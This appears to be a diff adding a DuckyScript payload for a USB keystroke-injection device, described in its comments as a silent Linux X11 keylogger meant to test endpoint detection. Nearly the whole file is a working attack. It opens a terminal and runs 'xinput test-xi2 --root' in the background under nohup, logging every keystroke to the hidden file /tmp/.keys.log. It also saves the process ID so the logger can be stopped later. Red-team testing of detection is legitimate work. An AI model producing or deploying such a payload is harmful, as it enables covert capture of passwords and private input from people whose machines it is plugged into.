@@ -1,0 +1,17 @@
+REM ============================================================
+REM  Linux · X11 Keylogger (xinput)
+REM ============================================================
+REM  Uses xinput to log all keystrokes on X11 desktops. Runs
+REM  silently in the background. Tests whether keylogger
+REM  detection is in place on the endpoint.
+REM
+REM  Output: /tmp/.keys.log
+REM  Stop: kill $(cat /tmp/.kl.pid)
+
+DEFAULTDELAY 80
+
+CTRL ALT t
+DELAY 1500
+STRINGLN nohup script -q /tmp/.keys.log -c "xinput test-xi2 --root" > /dev/null 2>&1 & echo $! > /tmp/.kl.pid
+DELAY 500
+STRINGLN exit
